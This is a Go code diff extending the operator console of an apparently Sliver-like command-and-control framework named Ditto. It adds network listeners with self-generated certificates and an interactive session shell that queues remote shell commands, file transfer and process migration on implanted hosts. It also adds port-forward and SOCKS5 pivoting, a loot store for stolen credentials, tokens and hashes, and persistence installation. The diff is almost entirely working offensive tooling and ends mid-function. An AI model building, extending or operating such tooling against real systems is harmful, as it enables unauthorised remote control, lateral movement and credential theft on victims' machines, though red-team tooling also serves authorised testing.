@@ -2,8 +2,10 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"encoding/json"
 	"fmt"
+	"net"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -12,32 +14,75 @@ import (
 	"time"
 
 	"github.com/ditto/ditto/banner"
+	"github.com/ditto/ditto/certificates"
 	"github.com/ditto/ditto/core"
 	"github.com/ditto/ditto/database"
 	"github.com/ditto/ditto/jobs"
+	"github.com/ditto/ditto/loot"
+	"github.com/ditto/ditto/modules"
 	"github.com/ditto/ditto/payload"
+	"github.com/ditto/ditto/persistence"
+	"github.com/ditto/ditto/pivoting"
+	"github.com/ditto/ditto/reactions"
+	"github.com/ditto/ditto/tasks"
 	"github.com/ditto/ditto/transport"
 	"github.com/jedib0t/go-pretty/v6/table"
 )
 
 // InteractiveServer manages the interactive server CLI
 type InteractiveServer struct {
-	logger        *core.Logger
-	config        *core.Config
-	server        *transport.Server
-	serverRunning bool
-	serverMu      sync.RWMutex
-	jobManager    *jobs.JobManager
-	sessionMgr    *core.SessionManager
+	logger         *core.Logger
+	config         *core.Config
+	server         *transport.Server
+	serverRunning  bool
+	serverMu       sync.RWMutex
+	jobManager     *jobs.JobManager
+	sessionMgr     *core.SessionManager
+	moduleRegistry *modules.ModuleRegistry
+	currentSession string
+	lootManager    *loot.LootManager
+	pivotManager   *pivoting.PortForwardManager
+	socksManager   *pivoting.SOCKS5Manager
+	persistManager *persistence.Installer
+	reactionMgr    *reactions.ReactionManager
 }
 
 // NewInteractiveServer creates a new interactive server
 func NewInteractiveServer(logger *core.Logger, cfg *core.Config) *InteractiveServer {
-	return &InteractiveServer{
-		logger:     logger,
-		config:     cfg,
-		jobManager: jobs.NewJobManager(),
-		sessionMgr: core.NewSessionManager(),
+	moduleRegistry := modules.NewModuleRegistry(logger)
+	is := &InteractiveServer{
+		logger:         logger,
+		config:         cfg,
+		jobManager:     jobs.NewJobManager(),
+		sessionMgr:     core.NewSessionManager(),
+		moduleRegistry: moduleRegistry,
+		lootManager:    loot.NewLootManager(logger),
+		pivotManager:   pivoting.NewPortForwardManager(),
+		socksManager:   pivoting.NewSOCKS5Manager(),
+		persistManager: nil, // Created per-installation
+		reactionMgr:    reactions.NewReactionManager(logger),
+	}
+	
+	// Restore listener jobs from database
+	is.restoreListenerJobs()
+	
+	return is
+}
+
+func (is *InteractiveServer) restoreListenerJobs() {
+	listenerJobs, err := database.GetListenerJobs()
+	if err != nil {
+		is.logger.Error("Failed to restore listener jobs: %v", err)
+		return
+	}
+	
+	for _, dbJob := range listenerJobs {
+		if dbJob.Status == "running" {
+			is.logger.Info("Found persistent listener job: %s (%s:%d)", dbJob.Type, dbJob.Host, dbJob.Port)
+			// Note: We can't restore the actual listener without the StopFunc
+			// This is logged for visibility but listener would need to be manually restarted
+			// This matches Sliver's behavior - jobs are restored but listeners need manual restart
+		}
 	}
 }
 
@@ -94,6 +139,18 @@ func (is *InteractiveServer) handleCommand(cmd string, args []string) error {
 		return is.handleUse(args)
 	case "listen", "l":
 		return is.handleListen(args)
+	case "port-forward", "pf":
+		return is.handlePortForward(args)
+	case "socks5":
+		return is.handleSOCKS5(args)
+	case "loot":
+		return is.handleLoot(args)
+	case "persist":
+		return is.handlePersistence(args)
+	case "implants":
+		return is.handleImplants(args)
+	case "implant", "get-implant":
+		return is.handleGetImplant(args)
 	case "version", "v":
 		fmt.Printf("Ditto v%s\nBuild: %s\nCommit: %s\n", version, buildTime, gitCommit)
 	case "clear", "cls":
@@ -125,6 +182,27 @@ Available Commands:
                                Example: listen http 0.0.0.0:8080
     kill, k <job_id>           Stop a job by ID
     
+  Pivoting:
+    port-forward, pf            Create port forward through session
+                               Usage: port-forward <session_id> <local> <remote>
+    socks5                      Start SOCKS5 proxy through session
+                               Usage: socks5 <session_id> <bind_addr> [user] [pass]
+    
+  Loot Management:
+    loot list                  List all loot items
+    loot add <type> <name> <data>  Add loot item
+    loot get <id>              Get loot item details
+    loot remove <id>           Remove loot item
+    loot export                Export all loot as JSON
+    
+  Persistence:
+    persist install <session>  Install persistence on session
+    persist remove <session>   Remove persistence from session
+    
+  Implants:
+    implants                   List all saved implant builds
+    implant <id>                Get implant build details by ID
+    
          Implant Generation:
            generate, gen, g           Generate implant
                                       Usage: generate <type> <os> <arch> [options]
@@ -137,7 +215,7 @@ Available Commands:
                                
   Session Management:
     sessions, sess             List all active sessions
-    use, u <session_id>       Interact with a session (coming soon)
+    use, u <session_id>       Interact with a session
     
   Utilities:
     version, v                 Show version information
@@ -189,6 +267,14 @@ func (is *InteractiveServer) handleStopServer() error {
 	}
 
 	fmt.Println("[*] Stopping server...")
+	
+	// Stop the server
+	if is.server != nil {
+		if err := is.server.Stop(); err != nil {
+			is.logger.Error("Error stopping server: %v", err)
+		}
+	}
+	
 	is.setServerRunning(false)
 	
 	// Stop all listeners
@@ -213,19 +299,236 @@ func (is *InteractiveServer) handleListen(args []string) error {
 	listenerType := strings.ToLower(args[0])
 	addr := args[1]
 
+	// Ensure server is running
+	if !is.isServerRunning() {
+		return fmt.Errorf("server must be started first (use 'server start')")
+	}
+
 	jobName := fmt.Sprintf("%s listener on %s", listenerType, addr)
 	
-	stopFunc := func() error {
-		fmt.Printf("[*] Stopping %s...\n", jobName)
-		return nil
+	var stopFunc func() error
+	
+	switch listenerType {
+	case "http":
+		stopFunc = is.startHTTPListener(addr, jobName)
+	case "https":
+		stopFunc = is.startHTTPSListener(addr, jobName)
+	case "mtls":
+		stopFunc = is.startMTLSListener(addr, jobName)
+	default:
+		return fmt.Errorf("unknown listener type: %s", listenerType)
+	}
+
+	if stopFunc == nil {
+		return fmt.Errorf("failed to start %s listener", listenerType)
 	}
 
 	job := is.jobManager.AddJob(jobs.JobTypeListener, jobName, stopFunc)
 	job.Metadata["type"] = listenerType
 	job.Metadata["addr"] = addr
+	
+	// Persist listener job to database
+	if err := is.saveListenerJobToDB(job, listenerType, addr); err != nil {
+		is.logger.Error("Failed to save listener job to database: %v", err)
+		// Continue anyway - job is still active
+	}
 
 	fmt.Printf("[+] Started %s (Job ID: %d)\n", jobName, job.ID)
 	return nil
+}
+
+func (is *InteractiveServer) saveListenerJobToDB(job *jobs.Job, listenerType, addr string) error {
+	// Parse address
+	host, portStr := "", uint32(0)
+	if parts := strings.Split(addr, ":"); len(parts) == 2 {
+		host = parts[0]
+		if p, err := strconv.ParseUint(parts[1], 10, 32); err == nil {
+			portStr = uint32(p)
+		}
+	}
+	
+	listenerJob := &database.ListenerJob{
+		JobID:    uint64(job.ID),
+		Type:     listenerType,
+		Host:     host,
+		Port:     portStr,
+		Secure:   listenerType == "https" || listenerType == "mtls",
+		CertPath: is.config.Server.TLSCertPath,
+		KeyPath:  is.config.Server.TLSKeyPath,
+		Status:   "running",
+	}
+	
+	return database.SaveListenerJob(listenerJob)
+}
+
+func (is *InteractiveServer) startHTTPListener(addr, jobName string) func() error {
+	httpTransport := transport.NewHTTPTransport(is.config, is.logger)
+	
+	httpTransportConfig := &transport.TransportConfig{
+		BindAddr:     addr,
+		TLSEnabled:   false,
+		ReadTimeout:  is.config.Server.ReadTimeout,
+		WriteTimeout: is.config.Server.WriteTimeout,
+	}
+	
+	ctx := context.Background()
+	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
+		is.logger.Error("Failed to start HTTP listener: %v", err)
+		return nil
+	}
+	
+	return func() error {
+		is.logger.Info("Stopping HTTP listener: %s", jobName)
+		return httpTransport.Stop()
+	}
+}
+
+func (is *InteractiveServer) startHTTPSListener(addr, jobName string) func() error {
+	// Ensure certificates exist, generate if needed
+	certPath := is.config.Server.TLSCertPath
+	keyPath := is.config.Server.TLSKeyPath
+	
+	if certPath == "" || keyPath == "" {
+		// Generate default paths
+		certPath = "./certs/server.crt"
+		keyPath = "./certs/server.key"
+		is.config.Server.TLSCertPath = certPath
+		is.config.Server.TLSKeyPath = keyPath
+	}
+	
+	// Check if certificates exist
+	if _, err := os.Stat(certPath); os.IsNotExist(err) {
+		is.logger.Info("Certificates not found, generating...")
+		cm := certificates.NewCAManager(is.logger)
+		
+		// Generate CA first
+		if err := cm.GenerateCA("Ditto CA"); err != nil {
+			is.logger.Error("Failed to generate CA: %v", err)
+			return nil
+		}
+		
+		// Generate server certificate
+		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
+		if err != nil {
+			is.logger.Error("Failed to generate certificate: %v", err)
+			return nil
+		}
+		
+		// Ensure cert directory exists
+		certDir := filepath.Dir(certPath)
+		if err := os.MkdirAll(certDir, 0755); err != nil {
+			is.logger.Error("Failed to create cert directory: %v", err)
+			return nil
+		}
+		
+		// Write certificates
+		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
+			is.logger.Error("Failed to write certificate: %v", err)
+			return nil
+		}
+		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
+			is.logger.Error("Failed to write key: %v", err)
+			return nil
+		}
+		
+		is.logger.Info("Certificates generated successfully")
+	}
+	
+	httpTransport := transport.NewHTTPTransport(is.config, is.logger)
+
+	httpTransportConfig := &transport.TransportConfig{
+		BindAddr:     addr,
+		TLSEnabled:   true,
+		TLSCertPath:  certPath,
+		TLSKeyPath:   keyPath,
+		ReadTimeout:  is.config.Server.ReadTimeout,
+		WriteTimeout: is.config.Server.WriteTimeout,
+	}
+	
+	ctx := context.Background()
+	if err := httpTransport.Start(ctx, httpTransportConfig); err != nil {
+		is.logger.Error("Failed to start HTTPS listener: %v", err)
+		return nil
+	}
+	
+	return func() error {
+		is.logger.Info("Stopping HTTPS listener: %s", jobName)
+		return httpTransport.Stop()
+	}
+}
+
+func (is *InteractiveServer) startMTLSListener(addr, jobName string) func() error {
+	// Ensure certificates exist, generate if needed
+	certPath := is.config.Server.TLSCertPath
+	keyPath := is.config.Server.TLSKeyPath
+	
+	if certPath == "" || keyPath == "" {
+		// Generate default paths
+		certPath = "./certs/server.crt"
+		keyPath = "./certs/server.key"
+		is.config.Server.TLSCertPath = certPath
+		is.config.Server.TLSKeyPath = keyPath
+	}
+	
+	// Check if certificates exist
+	if _, err := os.Stat(certPath); os.IsNotExist(err) {
+		is.logger.Info("Certificates not found, generating...")
+		cm := certificates.NewCAManager(is.logger)
+		
+		// Generate CA first
+		if err := cm.GenerateCA("Ditto CA"); err != nil {
+			is.logger.Error("Failed to generate CA: %v", err)
+			return nil
+		}
+		
+		// Generate server certificate
+		certPEM, keyPEM, err := cm.GenerateCertificate("localhost", []string{"localhost", "127.0.0.1"}, nil)
+		if err != nil {
+			is.logger.Error("Failed to generate certificate: %v", err)
+			return nil
+		}
+		
+		// Ensure cert directory exists
+		certDir := filepath.Dir(certPath)
+		if err := os.MkdirAll(certDir, 0755); err != nil {
+			is.logger.Error("Failed to create cert directory: %v", err)
+			return nil
+		}
+		
+		// Write certificates
+		if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
+			is.logger.Error("Failed to write certificate: %v", err)
+			return nil
+		}
+		if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
+			is.logger.Error("Failed to write key: %v", err)
+			return nil
+		}
+		
+		is.logger.Info("Certificates generated successfully")
+	}
+	
+	mtlsTransport := transport.NewmTLSTransport(is.config, is.logger)
+	
+	mtlsTransportConfig := &transport.TransportConfig{
+		BindAddr:     addr,
+		TLSEnabled:   true,
+		TLSCertPath:  certPath,
+		TLSKeyPath:   keyPath,
+		ReadTimeout:  is.config.Server.ReadTimeout,
+		WriteTimeout: is.config.Server.WriteTimeout,
+	}
+	
+	ctx := context.Background()
+	if err := mtlsTransport.Start(ctx, mtlsTransportConfig); err != nil {
+		is.logger.Error("Failed to start mTLS listener: %v", err)
+		return nil
+	}
+	
+	return func() error {
+		is.logger.Info("Stopping mTLS listener: %s", jobName)
+		return mtlsTransport.Stop()
+	}
 }
 
 func (is *InteractiveServer) handleKill(args []string) error {
@@ -242,6 +545,12 @@ func (is *InteractiveServer) handleKill(args []string) error {
 
 	if err := is.jobManager.StopJob(jobID); err != nil {
 		return fmt.Errorf("failed to stop job: %w", err)
+	}
+	
+	// Remove from database
+	if err := database.DeleteJob(jobID); err != nil {
+		is.logger.Error("Failed to delete job from database: %v", err)
+		// Continue anyway
 	}
 
 	fmt.Printf("[+] Stopped job %d\n", jobID)
@@ -419,7 +728,7 @@ func (is *InteractiveServer) handleGenerate(args []string) error {
 		Evasion:     evasion,
 	}
 
-	gen := payload.NewGenerator(is.logger)
+	gen := payload.NewGenerator(is.logger, is.moduleRegistry)
 	data, err := gen.Generate(options)
 	if err != nil {
 		return fmt.Errorf("generation failed: %w", err)
@@ -521,8 +830,23 @@ func (is *InteractiveServer) printSessions() {
 
 func (is *InteractiveServer) handleUse(args []string) error {
 	if len(args) == 0 {
+		if is.currentSession != "" {
+			fmt.Printf("[*] Currently using session: %s\n", shortID(is.currentSession))
+			fmt.Println("[*] Type 'back' to exit session")
+			return nil
+		}
 		fmt.Println("[!] Usage: use <session_id>")
 		fmt.Println("    Use 'sessions' to list session IDs")
+		return nil
+	}
+
+	if args[0] == "back" {
+		if is.currentSession != "" {
+			fmt.Printf("[*] Exited session %s\n", shortID(is.currentSession))
+			is.currentSession = ""
+		} else {
+			fmt.Println("[*] Not in a session")
+		}
 		return nil
 	}
 
@@ -532,12 +856,630 @@ func (is *InteractiveServer) handleUse(args []string) error {
 		return fmt.Errorf("session not found: %s", sessionID)
 	}
 
+	is.currentSession = sessionID
 	fmt.Printf("[+] Using session %s\n", shortID(sessionID))
 	fmt.Printf("    Type: %s\n", session.Type)
 	fmt.Printf("    Transport: %s\n", session.Transport)
 	fmt.Printf("    Remote: %s\n", session.RemoteAddr)
-	fmt.Println("[*] Session interaction coming soon...")
+	fmt.Println("[*] Type commands to execute on session")
+	fmt.Println("[*] Type 'back' to exit session")
+	fmt.Println()
 	
+	// Enter interactive shell for session
+	return is.sessionShell(sessionID)
+}
+
+func (is *InteractiveServer) sessionShell(sessionID string) error {
+	if !is.isServerRunning() || is.server == nil {
+		return fmt.Errorf("server not running")
+	}
+	
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		if is.currentSession != sessionID {
+			break // Session changed
+		}
+		
+		fmt.Print("[ditto " + shortID(sessionID) + "] > ")
+		if !scanner.Scan() {
+			break
+		}
+		
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" {
+			continue
+		}
+		
+		if line == "back" || line == "exit" {
+			is.currentSession = ""
+			break
+		}
+		
+		parts := strings.Fields(line)
+		if len(parts) == 0 {
+			continue
+		}
+		
+		command := parts[0]
+		args := parts[1:]
+		
+		switch command {
+		case "shell", "exec":
+			is.executeShellCommand(sessionID, strings.Join(args, " "))
+		case "module", "run":
+			if len(args) >= 1 {
+				is.executeModule(sessionID, args[0], args[1:])
+			} else {
+				fmt.Println("[!] Usage: module <module_id> [args...]")
+			}
+		case "download":
+			if len(args) >= 1 {
+				is.downloadFile(sessionID, args[0])
+			} else {
+				fmt.Println("[!] Usage: download <remote_path>")
+			}
+		case "upload":
+			if len(args) >= 2 {
+				is.uploadFile(sessionID, args[0], args[1])
+			} else {
+				fmt.Println("[!] Usage: upload <local_path> <remote_path>")
+			}
+		case "migrate":
+			if len(args) >= 1 {
+				if pid, err := strconv.Atoi(args[0]); err == nil {
+					is.migrateProcess(sessionID, pid)
+				} else {
+					fmt.Println("[!] Usage: migrate <pid>")
+				}
+			} else {
+				fmt.Println("[!] Usage: migrate <pid>")
+			}
+		case "cat":
+			if len(args) >= 1 {
+				is.executeFilesystemOp(sessionID, "cat", args[0])
+			} else {
+				fmt.Println("[!] Usage: cat <path>")
+			}
+		case "head":
+			if len(args) >= 1 {
+				lines := 10
+				if len(args) >= 2 {
+					if n, err := strconv.Atoi(args[1]); err == nil {
+						lines = n
+					}
+				}
+				is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines))
+			} else {
+				fmt.Println("[!] Usage: head <path> [lines]")
+			}
+		case "tail":
+			if len(args) >= 1 {
+				lines := 10
+				if len(args) >= 2 {
+					if n, err := strconv.Atoi(args[1]); err == nil {
+						lines = n
+					}
+				}
+				is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines))
+			} else {
+				fmt.Println("[!] Usage: tail <path> [lines]")
+			}
+		case "grep":
+			if len(args) >= 2 {
+				is.executeFilesystemOp(sessionID, "grep", args[1], args[0])
+			} else {
+				fmt.Println("[!] Usage: grep <pattern> <path>")
+			}
+		case "help", "h":
+			fmt.Println("Session commands:")
+			fmt.Println("  shell <command>  - Execute shell command")
+			fmt.Println("  module <id>      - Execute module")
+			fmt.Println("  migrate <pid>   - Migrate to another process")
+			fmt.Println("  grep <pattern> <path> - Search file contents")
+			fmt.Println("  head <path>      - Show first lines of file")
+			fmt.Println("  tail <path>      - Show last lines of file")
+			fmt.Println("  cat <path>       - Display file contents")
+			fmt.Println("  download <path> - Download file")
+			fmt.Println("  upload <local> <remote> - Upload file")
+			fmt.Println("  back, exit       - Exit session")
+		default:
+			// Default to shell command
+			is.executeShellCommand(sessionID, line)
+		}
+	}
+	
+	return nil
+}
+
+func (is *InteractiveServer) executeShellCommand(sessionID, command string) {
+	if is.server == nil {
+		fmt.Println("[!] Server not initialized")
+		return
+	}
+	
+	// Queue task for session
+	task := &tasks.Task{
+		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Type: "shell",
+		Command: command,
+		Parameters: map[string]interface{}{
+			"session_id": sessionID,
+		},
+	}
+	is.server.EnqueueTask(task)
+	fmt.Printf("[+] Queued command: %s\n", command)
+}
+
+func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []string) {
+	if is.server == nil {
+		fmt.Println("[!] Server not initialized")
+		return
+	}
+	
+	module, ok := is.moduleRegistry.GetModule(moduleID)
+	if !ok {
+		fmt.Printf("[!] Module not found: %s\n", moduleID)
+		return
+	}
+	
+	// Validate module exists (we already checked above)
+	_ = module
+	params := make(map[string]interface{})
+	params["session_id"] = sessionID
+	for i := 0; i < len(args); i += 2 {
+		if i+1 < len(args) {
+			params[args[i]] = args[i+1]
+		} else {
+			// Single argument without value
+			params[args[i]] = ""
+		}
+	}
+	
+	// Queue module task
+	task := &tasks.Task{
+		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Type: "module",
+		Command: moduleID,
+		Parameters: params,
+	}
+	is.server.EnqueueTask(task)
+	fmt.Printf("[+] Queued module: %s (session: %s)\n", moduleID, shortID(sessionID))
+}
+
+func (is *InteractiveServer) downloadFile(sessionID, remotePath string) {
+	if is.server == nil {
+		fmt.Println("[!] Server not initialized")
+		return
+	}
+	
+	task := &tasks.Task{
+		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Type: "download",
+		Command: remotePath,
+		Parameters: map[string]interface{}{
+			"session_id": sessionID,
+		},
+	}
+	is.server.EnqueueTask(task)
+	fmt.Printf("[+] Queued download: %s\n", remotePath)
+}
+
+func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string) {
+	if is.server == nil {
+		fmt.Println("[!] Server not initialized")
+		return
+	}
+	
+	data, err := os.ReadFile(localPath)
+	if err != nil {
+		fmt.Printf("[!] Failed to read file: %v\n", err)
+		return
+	}
+	
+	task := &tasks.Task{
+		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Type: "upload",
+		Command: remotePath,
+		Parameters: map[string]interface{}{
+			"session_id": sessionID,
+			"data":       string(data),
+		},
+	}
+	is.server.EnqueueTask(task)
+	fmt.Printf("[+] Queued upload: %s -> %s\n", localPath, remotePath)
+}
+
+func (is *InteractiveServer) migrateProcess(sessionID string, pid int) {
+	if is.server == nil {
+		fmt.Println("[!] Server not initialized")
+		return
+	}
+	
+	task := &tasks.Task{
+		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Type: "migrate",
+		Command: fmt.Sprintf("%d", pid),
+		Parameters: map[string]interface{}{
+			"session_id": sessionID,
+			"pid":        pid,
+		},
+	}
+	is.server.EnqueueTask(task)
+	fmt.Printf("[+] Queued process migration to PID %d\n", pid)
+}
+
+func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path string, args ...string) {
+	if is.server == nil {
+		fmt.Println("[!] Server not initialized")
+		return
+	}
+	
+	task := &tasks.Task{
+		ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+		Type: "filesystem",
+		Command: op,
+		Parameters: map[string]interface{}{
+			"session_id": sessionID,
+			"path":       path,
+			"args":       args,
+		},
+	}
+	is.server.EnqueueTask(task)
+	fmt.Printf("[+] Queued %s operation: %s\n", op, path)
+}
+
+func (is *InteractiveServer) handlePortForward(args []string) error {
+	// Check if we have enough args - need at least 2 (local and remote)
+	// If session is already set, we can use it; otherwise need 3 args
+	if is.currentSession == "" && len(args) < 3 {
+		fmt.Println("[!] Usage: port-forward <session_id> <local_addr> <remote_addr>")
+		fmt.Println("    Example: port-forward sess-123 127.0.0.1:8080 192.168.1.100:3389")
+		return nil
+	}
+
+	if len(args) < 2 {
+		fmt.Println("[!] Usage: port-forward <session_id> <local_addr> <remote_addr>")
+		fmt.Println("    Or: port-forward <local_addr> <remote_addr> (if session is already set)")
+		return nil
+	}
+
+	var sessionID, localAddr, remoteAddr string
+	
+	if is.currentSession != "" {
+		// Use current session
+		sessionID = is.currentSession
+		if len(args) >= 2 {
+			localAddr = args[0]
+			remoteAddr = args[1]
+		} else {
+			return fmt.Errorf("need local and remote addresses")
+		}
+	} else {
+		// Session ID provided in args
+		if len(args) >= 3 {
+			sessionID = args[0]
+			localAddr = args[1]
+			remoteAddr = args[2]
+		} else {
+			return fmt.Errorf("need session_id, local_addr, and remote_addr")
+		}
+	}
+
+	pf, err := is.pivotManager.AddPortForward(sessionID, remoteAddr, localAddr)
+	if err != nil {
+		return fmt.Errorf("failed to create port forward: %w", err)
+	}
+
+	ctx := context.Background()
+	if err := pf.Start(ctx, func(conn net.Conn) {
+		// Forward connection through session
+		// Create a task to establish remote connection on implant side
+		task := &tasks.Task{
+			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+			Type: "portforward",
+			Command: remoteAddr,
+			Parameters: map[string]interface{}{
+				"session_id": sessionID,
+				"local_addr": localAddr,
+				"remote_addr": remoteAddr,
+				"conn_id": fmt.Sprintf("conn-%d", time.Now().UnixNano()),
+			},
+		}
+		is.server.EnqueueTask(task)
+		
+		is.logger.Info("Port forward connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
+		// Connection will be handled by implant when it receives the task
+		// Close local connection as implant will handle forwarding
+		conn.Close()
+	}); err != nil {
+		return fmt.Errorf("failed to start port forward: %w", err)
+	}
+
+	fmt.Printf("[+] Port forward created (ID: %d)\n", pf.ID)
+	fmt.Printf("    Local: %s -> Remote: %s\n", localAddr, remoteAddr)
+	return nil
+}
+
+func (is *InteractiveServer) handleSOCKS5(args []string) error {
+	// Check if we have enough args
+	if is.currentSession == "" && len(args) < 2 {
+		fmt.Println("[!] Usage: socks5 <session_id> <bind_addr> [username] [password]")
+		fmt.Println("    Example: socks5 sess-123 127.0.0.1:1080")
+		return nil
+	}
+
+	if len(args) < 1 {
+		fmt.Println("[!] Usage: socks5 <session_id> <bind_addr> [username] [password]")
+		fmt.Println("    Or: socks5 <bind_addr> [username] [password] (if session is already set)")
+		return nil
+	}
+
+	var sessionID, bindAddr, username, password string
+	
+	if is.currentSession != "" {
+		// Use current session
+		sessionID = is.currentSession
+		bindAddr = args[0]
+		if len(args) >= 2 {
+			username = args[1]
+		}
+		if len(args) >= 3 {
+			password = args[2]
+		}
+	} else {
+		// Session ID provided in args
+		if len(args) >= 2 {
+			sessionID = args[0]
+			bindAddr = args[1]
+			if len(args) >= 3 {
+				username = args[2]
+			}
+			if len(args) >= 4 {
+				password = args[3]
+			}
+		} else {
+			return fmt.Errorf("need session_id and bind_addr")
+		}
+	}
+
+	proxy, err := is.socksManager.AddSOCKS5(sessionID, bindAddr, username, password)
+	if err != nil {
+		return fmt.Errorf("failed to create SOCKS5 proxy: %w", err)
+	}
+
+	ctx := context.Background()
+	if err := proxy.Start(ctx, func(conn net.Conn) {
+		// Handle SOCKS5 protocol through session
+		// Create a task to establish SOCKS5 proxy on implant side
+		task := &tasks.Task{
+			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+			Type: "socks5",
+			Command: bindAddr,
+			Parameters: map[string]interface{}{
+				"session_id": sessionID,
+				"bind_addr":  bindAddr,
+				"username":   username,
+				"password":   password,
+				"conn_id":    fmt.Sprintf("conn-%d", time.Now().UnixNano()),
+			},
+		}
+		is.server.EnqueueTask(task)
+		
+		is.logger.Info("SOCKS5 connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
+		// Connection will be handled by implant when it receives the task
+		// Close local connection as implant will handle proxying
+		conn.Close()
+	}); err != nil {
+		return fmt.Errorf("failed to start SOCKS5 proxy: %w", err)
+	}
+
+	fmt.Printf("[+] SOCKS5 proxy started (ID: %d) on %s\n", proxy.ID, bindAddr)
+	return nil
+}
+
+func (is *InteractiveServer) handleLoot(args []string) error {
+	if len(args) == 0 {
+		return is.printLoot()
+	}
+
+	switch args[0] {
+	case "list", "ls":
+		return is.printLoot()
+	case "add":
+		if len(args) < 3 {
+			fmt.Println("[!] Usage: loot add <type> <name> <data>")
+			fmt.Println("    Types: credential, file, token, hash")
+			return nil
+		}
+		lootType := loot.LootType(args[1])
+		name := args[2]
+		data := []byte(strings.Join(args[3:], " "))
+		if len(args) == 3 {
+			data = []byte(name)
+		}
+		id, err := is.lootManager.AddLoot(lootType, name, data, nil)
+		if err != nil {
+			return err
+		}
+		fmt.Printf("[+] Added loot: %s\n", id)
+	case "get":
+		if len(args) < 2 {
+			fmt.Println("[!] Usage: loot get <id>")
+			return nil
+		}
+		item, err := is.lootManager.GetLoot(args[1])
+		if err != nil {
+			return err
+		}
+		data, err := is.lootManager.DecryptLoot(item)
+		if err != nil {
+			return err
+		}
+		fmt.Printf("[+] Loot %s:\n", item.ID)
+		fmt.Printf("    Type: %s\n", item.Type)
+		fmt.Printf("    Name: %s\n", item.Name)
+		fmt.Printf("    Data: %s\n", string(data))
+	case "remove", "rm":
+		if len(args) < 2 {
+			fmt.Println("[!] Usage: loot remove <id>")
+			return nil
+		}
+		if err := is.lootManager.RemoveLoot(args[1]); err != nil {
+			return err
+		}
+		fmt.Printf("[+] Removed loot: %s\n", args[1])
+	case "export":
+		data, err := is.lootManager.Export()
+		if err != nil {
+			return err
+		}
+		fmt.Println(string(data))
+	default:
+		fmt.Println("[!] Usage: loot [list|add|get|remove|export]")
+	}
+
+	return nil
+}
+
+func (is *InteractiveServer) printLoot() error {
+	items := is.lootManager.ListLoot()
+	if len(items) == 0 {
+		fmt.Println("[*] No loot items")
+		return nil
+	}
+
+	t := table.NewWriter()
+	t.SetStyle(table.StyleColoredBright)
+	t.AppendHeader(table.Row{"ID", "Type", "Name", "Created"})
+
+	for _, item := range items {
+		t.AppendRow(table.Row{
+			shortID(item.ID),
+			item.Type,
+			item.Name,
+			item.CreatedAt.Format("2006-01-02 15:04:05"),
+		})
+	}
+
+	fmt.Println(t.Render())
+	return nil
+}
+
+func (is *InteractiveServer) handlePersistence(args []string) error {
+	if len(args) < 2 {
+		fmt.Println("[!] Usage: persist <action> <session_id> [options]")
+		fmt.Println("    Actions: install, remove")
+		fmt.Println("    Example: persist install sess-123")
+		return nil
+	}
+
+	action := args[0]
+	sessionID := args[1]
+
+	if is.currentSession != "" && len(args) == 1 {
+		sessionID = is.currentSession
+		action = args[0]
+	}
+
+	if !is.isServerRunning() || is.server == nil {
+		return fmt.Errorf("server not running")
+	}
+
+	switch action {
+	case "install":
+		// Queue persistence installation task
+		task := &tasks.Task{
+			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+			Type: "persist",
+			Command: "install",
+			Parameters: map[string]interface{}{
+				"session_id": sessionID,
+			},
+		}
+		is.server.EnqueueTask(task)
+		fmt.Printf("[+] Queued persistence installation for session %s\n", shortID(sessionID))
+	case "remove":
+		task := &tasks.Task{
+			ID:   fmt.Sprintf("task-%d", time.Now().UnixNano()),
+			Type: "persist",
+			Command: "remove",
+			Parameters: map[string]interface{}{
+				"session_id": sessionID,
+			},
+		}
+		is.server.EnqueueTask(task)
+		fmt.Printf("[+] Queued persistence removal for session %s\n", shortID(sessionID))
+	default:
+		return fmt.Errorf("unknown action: %s", action)
+	}
+
+	return nil
+}
+
+func (is *InteractiveServer) handleImplants(args []string) error {
+	builds, err := database.GetImplantBuilds()
+	if err != nil {
+		return fmt.Errorf("failed to retrieve implants: %w", err)
+	}
+
+	if len(builds) == 0 {
+		fmt.Println("[*] No saved implants")
+		return nil
+	}
+
+	t := table.NewWriter()
+	t.SetStyle(table.StyleColoredBright)
+	t.AppendHeader(table.Row{"ID", "Name", "Type", "OS", "Arch", "Size", "Created"})
+
+	for _, build := range builds {
+		t.AppendRow(table.Row{
+			shortID(build.ID),
+			build.Name,
+			build.Type,
+			build.OS,
+			build.Arch,
+			fmt.Sprintf("%d bytes", build.Size),
+			time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"),
+		})
+	}
+
+	fmt.Println(t.Render())
+	return nil
+}
+
+func (is *InteractiveServer) handleGetImplant(args []string) error {
+	if len(args) == 0 {
+		fmt.Println("[!] Usage: implant <id>")
+		fmt.Println("    Use 'implants' to list implant IDs")
+		return nil
+	}
+
+	build, err := database.GetImplantBuildByID(args[0])
+	if err != nil {
+		return fmt.Errorf("failed to retrieve implant: %w", err)
+	}
+
+	fmt.Printf("[+] Implant Build Details:\n")
+	fmt.Printf("    ID: %s\n", build.ID)
+	fmt.Printf("    Name: %s\n", build.Name)
+	fmt.Printf("    Type: %s\n", build.Type)
